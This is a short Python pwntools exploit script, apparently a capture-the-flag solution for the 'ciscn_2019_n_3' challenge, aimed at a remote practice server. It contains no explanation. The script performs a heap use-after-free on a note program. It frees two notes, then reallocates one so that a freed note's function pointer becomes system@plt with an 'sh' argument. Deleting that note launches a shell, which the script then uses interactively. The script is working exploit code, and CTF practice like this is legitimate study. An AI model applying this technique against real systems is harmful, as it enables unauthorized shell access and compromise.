from pwn import *

context(os = 'linux', arch = 'i386', log_level = 'debug')
# io = process('ciscn_2019_n_3')
io = remote('node4.buuoj.cn', 25370)
elf = ELF('ciscn_2019_n_3')
system_plt = elf.plt['system']


def add_text(index, size, text):
	io.sendlineafter('CNote > ', '1')
	io.sendlineafter('Index > ', str(index))
	io.sendlineafter('Type > ', '2')
	io.sendlineafter('Length > ', str(size))
	io.sendafter('Value > ', text)


def delete(index):
	io.sendlineafter('CNote > ', '2')
	io.sendlineafter('Index > ', str(index))


def show(index):
	io.sendlineafter('CNote > ', '3')
	io.sendlineafter('Index > ', str(index))


if __name__ == '__main__':
	add_text(0, 0x80, '\n')
	add_text(1, 0x38, '\n')
	delete(0)
	delete(1)
	add_text(2, 0xC, b'sh\x00\x00' + p32(system_plt) + b'\n')
	delete(0)
	io.interactive()


